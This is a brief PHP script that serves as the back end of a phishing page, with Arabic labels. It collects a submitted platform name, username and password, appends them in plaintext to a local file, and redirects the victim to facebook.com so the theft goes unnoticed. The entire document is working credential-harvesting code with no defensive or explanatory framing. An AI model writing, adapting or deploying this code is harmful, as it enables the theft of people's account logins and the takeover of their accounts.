<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $platform = $_POST['platform'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    $file = fopen("usernames.txt", "a");
    fwrite($file, "المنصة: " . $platform . " | المستخدم: " . $username . " | كلمة المرور: " . $password . "\n");
    fclose($file);

    header("Location: https://www.facebook.com");
    exit();
}
?>
